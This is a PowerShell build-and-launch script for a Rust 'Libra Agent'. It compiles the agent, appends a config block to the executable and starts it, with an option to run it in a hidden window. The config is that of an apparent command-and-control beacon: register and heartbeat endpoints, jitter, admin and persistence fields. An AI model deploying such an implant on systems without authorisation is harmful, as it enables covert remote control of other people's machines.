# Libra Agent Windows Install Script
# Auto-detects environment, builds Rust agent, injects config, and runs

param(
    [string]$Server = "",
    [int]$Port = 5270,
    [switch]$Desktop = $false,
    [switch]$BuildOnly = $false,
    [switch]$SkipBuild = $false
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Libra Agent - Windows Install Script" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ── 1. Environment Detection ────────────────────────────────────────────

Write-Host "[1/5] Detecting environment..." -ForegroundColor Yellow

$OS = (Get-CimInstance Win32_OperatingSystem)
Write-Host "  OS:      $($OS.Caption)"
Write-Host "  Arch:    $($env:PROCESSOR_ARCHITECTURE)"

# Check Rust toolchain
$cargoVersion = cargo --version 2>$null
if (-not $cargoVersion) {
    Write-Host "  [ERROR] Cargo not found. Install Rust from https://rustup.rs" -ForegroundColor Red
    Write-Host "          Run: winget install Rustlang.Rustup" -ForegroundColor Red
    exit 1
}
Write-Host "  Rust:    $($cargoVersion.Trim())"

$rustupTargets = rustup target list --installed 2>$null
Write-Host "  Targets: $($rustupTargets -join ', ')"

# Check Git
$gitVersion = git --version 2>$null
if (-not $gitVersion) {
    Write-Host "  [WARN] Git not found. Build may fail if deps need fetching." -ForegroundColor DarkYellow
} else {
    Write-Host "  Git:     $($gitVersion.Trim())"
}

Write-Host ""

# ── 2. Server Configuration ────────────────────────────────────────────

Write-Host "[2/5] Server configuration..." -ForegroundColor Yellow

if (-not $Server) {
    $Server = Read-Host "  Enter server IP/hostname [127.0.0.1]"
    if (-not $Server) { $Server = "127.0.0.1" }
}

$ServerUrl = "http://${Server}:${Port}"
Write-Host "  Server URL: $ServerUrl"
Write-Host ""

# ── 3. Build ───────────────────────────────────────────────────────────

Write-Host "[3/5] Building agent..." -ForegroundColor Yellow

Push-Location $ScriptDir

if (-not $SkipBuild) {
    $features = ""
    if ($Desktop) {
        $features = "--features desktop"
        Write-Host "  Mode: Desktop (no console window)"
    } else {
        Write-Host "  Mode: Console"
    }

    Write-Host "  Running: cargo build --release $features"
    $buildArgs = @("build", "--release")
    if ($Desktop) { $buildArgs += "--features", "desktop" }

    $proc = Start-Process -FilePath "cargo" -ArgumentList $buildArgs -NoNewWindow -Wait -PassThru
    if ($proc.ExitCode -ne 0) {
        Write-Host "  [ERROR] Build failed (exit code: $($proc.ExitCode))" -ForegroundColor Red
        Pop-Location
        exit 1
    }
    Write-Host "  Build succeeded." -ForegroundColor Green
} else {
    Write-Host "  Skipping build (--SkipBuild)." -ForegroundColor DarkYellow
}

# ── 4. Locate Binary & Inject Config ────────────────────────────────────

Write-Host "[4/5] Preparing binary..." -ForegroundColor Yellow

$ExePath = Join-Path $ScriptDir "target\release\agent.exe"
if (-not (Test-Path $ExePath)) {
    # Try target triple subdirectory
    $releaseDirs = Get-ChildItem -Path (Join-Path $ScriptDir "target") -Recurse -Directory -Filter "release" -Depth 2 2>$null
    if ($releaseDirs) {
        foreach ($dir in $releaseDirs) {
            $candidate = Join-Path $dir.FullName "agent.exe"
            if (Test-Path $candidate) {
                $ExePath = $candidate
                break
            }
        }
    }
}

if (-not (Test-Path $ExePath)) {
    Write-Host "  [ERROR] Binary not found at: $ExePath" -ForegroundColor Red
    Write-Host "  Searched release directories. Check build output." -ForegroundColor Red
    Pop-Location
    exit 1
}

$sizeKB = [math]::Round((Get-Item $ExePath).Length / 1KB)
Write-Host "  Binary: $ExePath ($sizeKB KB)"

# Inject config
Write-Host "  Injecting config..."

$config = @{
    server_url = $ServerUrl
    register_path = "/api/beacon/register"
    heartbeat_path = "/api/beacon/heartbeat"
    result_path = "/api/beacon/result"
    ws_path = "/ws/agent"
    heartbeat_interval_ms = 3000
    jitter_percent = 0.2
    require_admin = $false
    copy_to_path = $null
    enable_persistence = $false
}

$configJson = ($config | ConvertTo-Json -Compress)
$configBytes = [System.Text.Encoding]::UTF8.GetBytes($configJson)
$magicBytes = [System.Text.Encoding]::UTF8.GetBytes("LIBRA_CFG_BLOCK!")
$lenBytes = [System.BitConverter]::GetBytes([uint32]$configBytes.Length)

$binBytes = [System.IO.File]::ReadAllBytes($ExePath)
$stream = [System.IO.File]::OpenWrite($ExePath)
$stream.Seek(0, [System.IO.SeekOrigin]::End) | Out-Null
$stream.Write($magicBytes, 0, $magicBytes.Length)
$stream.Write($lenBytes, 0, $lenBytes.Length)
$stream.Write($configBytes, 0, $configBytes.Length)
$stream.Close()

Write-Host "  Config injected: $($configJson.Length) bytes" -ForegroundColor Green

# Create a copy without config block (for reuse)
$CleanPath = Join-Path $ScriptDir "target\release\agent-clean.exe"
if (-not (Test-Path $CleanPath)) {
    Copy-Item $ExePath $CleanPath
    Write-Host "  Clean backup saved: $CleanPath"
}

Write-Host ""

# ── 5. Run ──────────────────────────────────────────────────────────────

if ($BuildOnly) {
    Write-Host "[5/5] Build-only mode. Binary ready at:" -ForegroundColor Yellow
    Write-Host "  $ExePath" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Run manually with:" -ForegroundColor DarkGray
    Write-Host "    .\target\release\agent.exe --server $ServerUrl" -ForegroundColor DarkGray
} else {
    Write-Host "[5/5] Starting agent..." -ForegroundColor Yellow
    Write-Host "  Connecting to: $ServerUrl"
    Write-Host "  Press Ctrl+C to stop."
    Write-Host ""

    if ($Desktop) {
        Start-Process -FilePath $ExePath -ArgumentList "--server", $ServerUrl -WindowStyle Hidden
        Write-Host "  Agent started in background (desktop mode)." -ForegroundColor Green
    } else {
        & $ExePath --server $ServerUrl
    }
}

Pop-Location
